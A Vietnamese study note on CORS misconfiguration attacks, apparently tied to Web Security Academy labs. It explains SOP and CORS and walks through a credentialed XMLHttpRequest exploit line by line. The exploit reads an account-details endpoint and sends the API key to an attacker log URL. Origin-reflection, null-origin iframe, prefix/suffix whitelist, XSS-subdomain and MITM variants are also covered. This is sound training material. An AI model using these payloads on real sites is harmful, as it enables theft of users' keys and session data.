## Khái niệm và bản chất chung

- CORS là một cơ chế nới lỏng có kiểm soát SOP (Same-Origin Policy)

- SOP là cơ chế ngăn chặn một origin khác có thể gửi request tới server, sau đó có thể đọc được dữ liệu nhạy cảm.

- Hai origin được định nghĩa là “same-origin” nếu như chúng có cùng: schema + host + port. Bản chất 1 domain vẫn có thể gửi request sang domain khác, nhưng SOP không cho phép JavaScript đọc response.

- CORS giúp server thông báo cho browser domain này được phép đọc response trả về. Server làm điều này bằng HTTP Header.

## Cách khai thác

- Trường hợp đơn giản nhất là trong response trả về có trường “Allow-Control-Allow-Credentials: true”, khi truyền thử trường “Origin” bất kỳ vào thì thấy có reflect trả về trong response mà không verify giá trị Origin này.

- “var req = new XMLHttpRequest()”: Tạo một HTTP Request bằng XMLHttpRequest

- “req.onload = reqListener”: Khi request hoàn tất và browser nhận repsonse, gọi hàm reqListener.

- “req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true)”: Gửi request GET đến endpoints mà trả API Key.

- “req.withCredentials=true”: Yêu cầu browser gửi kèm credentials (Cookie, token,…).

- “req.send()”: Gửi request

- “location='/log?key='+this.responseText”: chuyển sang URL /log, gắn nội dung “responseText” ở đây là APIKey.

- Cách khai thác bằng việc kiểm tra domain bằng chuỗi nhưng lại cấu hình bằng funciton “endsWith()” hoặc “startsWith()”, attacker có thể lợi dụng để điều chỉnh request gửi đến server để nhận được kết quả mong muốn.

- Cách khai thác bằng “Origin: Null”: Lỗi whitelist “null”, server cho phép một trang có Origin là “null” đọc response, đồng thời cho phép gửi kèm cookie đăng nhập.

- Iframe là một trang web nhỏ được nhúng bên trong trang hiện tại, có thể chạy Js và gửi request độc lập với trang bên ngoài.

- Thuộc tính “sandbox” cô lập nội dung trong iframe và “allow-scripts” là để cho phép chạy JavaScript.

- “var req = new XMLHttpRequest()”: Tạo một HTTP Request bằng XMLHttpRequest

- “req.onload = reqListener”: Khi request hoàn tất và browser nhận repsonse, gọi hàm reqListener.

- “req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true)”: Gửi request GET đến endpoints mà trả API Key.

- “req.withCredentials=true”: Yêu cầu browser gửi kèm credentials (Cookie, token,…).

- “req.send()”: Gửi request

- “location='/log?key='+encodeURIComponent(this.responseText)”: chuyển sang URL /log, gắn nội dung “responseText” ở đây là APIKey.

- Khai thác bằng việc lợi dụng một subdomain ở trong whitelist có lỗ hổng XSS, sau đó lợi dụng để đưa victim đến URL mục tiêu  victim thấy Origin nằm trong whitelist, hợp lệ nên cho phép đọc response.

- Website chính sử dụng method https nhưng lại whitelist cho 1 subdomain dùng http. Khi này attacker sẽ thực hiện tấn công MITM, cụ thể khi victim gửi 1 request http không mã hóa đến “http://example.com” , attacker sẽ chặn response phản hồi và thay bằng việc chuyển hướng đến trang http được whitelist “http://trusted-subdomain.vulnerable-website.com”, sau đó thực hiện lại tấn công như trên, chặn response của subdomain và thay bằng HTML chứa Javascript độc hại.
